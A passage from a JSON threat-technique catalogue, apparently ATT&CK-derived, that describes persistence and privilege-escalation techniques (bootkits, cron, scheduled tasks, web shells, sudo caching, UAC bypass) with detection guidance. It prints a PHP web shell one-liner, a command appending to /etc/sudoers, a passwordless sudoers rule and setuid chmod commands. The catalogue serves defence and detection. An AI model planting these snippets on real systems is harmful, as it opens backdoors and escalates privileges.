        "detection": "\nData and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology)     disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.Disk check and forensic utilities   may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.\n\n"
      },
      "T1542.003": {
        "name": "Bootkit",
        "description": " \nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. \nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  \nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.  \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.  ",
        "detection": "\nPerform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.\n\n"
      },
      "T1542.004": {
        "name": "ROMMONkit",
        "description": " \nAdversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.  \n \n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to  TFTP Boot , an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.  ",
        "detection": "\nThere are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.\n\n"
      },
      "T1542.005": {
        "name": "TFTP Boot",
        "description": " \nAdversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. \nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with  Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to  ROMMONkit and may result in the network device running a modified image.  \n ",
        "detection": "\nConsider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS.    The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.   Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.   Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment.   Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.\n\n"
      },
      "T1053": {
        "name": "Scheduled Task/Job",
        "description": " \nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.  \n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.001": {
        "name": "At (Linux)",
        "description": " \nAdversaries may abuse the  at utility to perform task scheduling for initial or recurring execution of malicious code. The  at command within Linux operating systems enables administrators to schedule tasks.  \n\nAn adversary may use  at in Linux environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.002": {
        "name": "At (Windows)",
        "description": " \nAdversaries may abuse the  at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The  at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using  at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \nAn adversary may use  at.exe in Windows environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM). \nNote: The  at.exe command line utility has been deprecated in current versions of Windows in favor of  schtasks .  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.   If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.   Several events will then be logged on scheduled task activity, including:   Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.  Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.003": {
        "name": "Cron",
        "description": " \nAdversaries may abuse the  cron utility to perform task scheduling for initial or recurring execution of malicious code. The  cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any  crontab files are stored in operating system-specific file paths. \nAn adversary may use  cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence.  cron can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. \n\n"
      },
      "T1053.004": {
        "name": "Launchd",
        "description": " \nAdversaries may abuse the  Launchd daemon to perform task scheduling for initial or recurring execution of malicious code. The  launchd daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in  /System/Library/LaunchDaemons and  /Library/LaunchDaemons   \n. These LaunchDaemons have property list files which point to the executables that will be launched  \n. \nAn adversary may use the  launchd daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence.  launchd can also be abused to run a process under the context of a specified account. Daemons, such as  launchd , run with the permissions of the root user account, and will operate regardless of which user account is logged in.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.005": {
        "name": "Scheduled Task",
        "description": " \nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The  schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task. \nThe deprecated  at utility could also be abused by adversaries (ex:  At (Windows) ), though  at.exe can not access tasks created with  schtasks or the Control Panel. \nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.   If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.   Several events will then be logged on scheduled task activity, including:   Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.  Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.006": {
        "name": "Systemd Timers",
        "description": " \nAdversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension  .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to  Cron in Linux environments.  \n\nEach  .timer file must have a corresponding  .service file with the same name, e.g.,  example.timer and  example.service .  .service files are  Systemd Service unit files that are managed by the systemd system and service manager.  \nPrivileged timers are written to  /etc/systemd/system/ and  /usr/lib/systemd/system while user level are written to  ~/.config/systemd/user/ . \nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.  \n \n \nTimers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.  ",
        "detection": "\nSystemd timer unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and ~/.config/systemd/user/ directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: systemctl list-timers –all. Analyze the contents of corresponding .service files present on the file system and ensure that they refer to legitimate, expected executables.Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers. \n\n"
      },
      "T1505": {
        "name": "Server Software Component",
        "description": " \nAdversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.  ",
        "detection": "\nConsider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.Process monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.   \n\n"
      },
      "T1505.001": {
        "name": "SQL Stored Procedures",
        "description": " \nAdversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). \nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.  \n \nTo execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.  \n \n \n \nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).  \nAdversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.  \n  ",
        "detection": "\nOn a MSSQL Server, consider monitoring for xp_cmdshell usage.  Consider enabling audit features that can log malicious startup activities.\n\n"
      },
      "T1505.002": {
        "name": "Transport Agent",
        "description": " \nAdversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.  \n \nTransport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.  \nThough a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.  ",
        "detection": "\nConsider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\n"
      },
      "T1505.003": {
        "name": "Web Shell",
        "description": " \nAdversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. \nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex:  China Chopper Web shell client).  \n  ",
        "detection": "\nWeb shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:   <?php @eval($_POST['password']);>Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.   \n\n"
      },
      "T1205": {
        "name": "Traffic Signaling",
        "description": " \nAdversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.  Port Knocking ), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software. \nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s). \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs. \nOn network devices, adversaries may use crafted packets to enable  Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  \n  \n  \nTo enable this traffic signaling on embedded devices, adversaries must first achieve and leverage  Patch System Image due to the monolithic nature of the architecture.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1205.001": {
        "name": "Port Knocking",
        "description": " \nAdversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. \nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1078": {
        "name": "Valid Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. \nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.  \n ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.   Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.001": {
        "name": "Default Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.  \n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen  Private Keys or credential materials to legitimately connect to remote environments via  Remote Services .  \n ",
        "detection": "\nMonitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.002": {
        "name": "Domain Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  \nDomain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.  \n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as  OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.\n\n"
      },
      "T1078.003": {
        "name": "Local Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \nLocal Accounts may also be abused to elevate privileges and harvest credentials through  OS Credential Dumping . Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.  ",
        "detection": "\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.\n\n"
      },
      "T1078.004": {
        "name": "Cloud Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.  \n \n \n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a  Trusted Relationship . Similar to  Domain Accounts , compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.  ",
        "detection": "\nMonitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.\n\n"
      }
    }
  },
  "TA0004": {
    "name": "Privilege Escalation",
    "description": "\nThe adversary is trying to gain higher-level permissions.Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: •   SYSTEM/root level•   local administrator•   user account with admin-like access •   user accounts with access to specific system or perform specific functionThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  \n",
    "technique": {
      "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "description": " \nAdversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.  ",
        "detection": "\nMonitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file.There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.\n\n"
      },
      "T1548.001": {
        "name": "Setuid and Setgid",
        "description": " \nAn adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively.  \n. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. \nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via  ls -l . The  chmod program can set these bits with via bitmasking,  chmod 4777 [file] or via shorthand naming,  chmod u+s [file] . \nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.  \n.  ",
        "detection": "\nMonitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.\n\n"
      },
      "T1548.002": {
        "name": "Bypass User Account Control",
        "description": " \nAdversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.  \n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated  Component Object Model objects without prompting the user through the UAC notification box.  \n  \nAn example of this is use of  Rundll32 to load a specifically crafted DLL which loads an auto-elevated  Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.  \n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods  \nthat have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:  eventvwr.exe can auto-elevate and execute a specified binary or script.  \n \n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.  \n ",
        "detection": "\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example: The eventvwr.exe bypass uses the [HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command Registry key. The sdclt.exe bypass uses the [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe and [HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand Registry keys.  Analysts should monitor these Registry settings for unauthorized changes.\n\n"
      },
      "T1548.003": {
        "name": "Sudo and Sudo Caching",
        "description": " \nAdversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges. \nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The  sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"  \nSince sudo was made for the system administrator, it has some useful configuration features such as a  timestamp_timeout , which is the amount of time in minutes between instances of  sudo before it will re-prompt for a password. This is because  sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at  /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a  tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). \nThe sudoers file,  /etc/sudoers , describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like  user1 ALL=(ALL) NOPASSWD: ALL   \n. Elevated privileges are required to edit this file though. \nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example,  /var/db/sudo 's timestamp can be monitored to see if it falls within the  timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if  tty_tickets is disabled, adversaries can do this from any tty for that user. \nIn the wild, malware has disabled  tty_tickets to potentially make scripting easier by issuing  echo \\'Defaults !tty_tickets\\' >> /etc/sudoers   \n. In order for this change to be reflected, the malware also issued  killall Terminal . As of macOS Sierra, the sudoers file has  tty_tickets enabled by default.  ",
        "detection": "\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file.\n\n"
      },
      "T1548.004": {
        "name": "Elevated Execution with Prompt",
        "description": " \nAdversaries may leverage the  AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.  \nThe purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. \nAdversaries may abuse  AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.  \n \n \nThis technique may be combined with  Masquerading to trick the user into granting escalated privileges to malicious code.  \n \nThis technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.  \n ",
        "detection": "\nConsider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\n"
      },
      "T1134": {
        "name": "Access Token Manipulation",
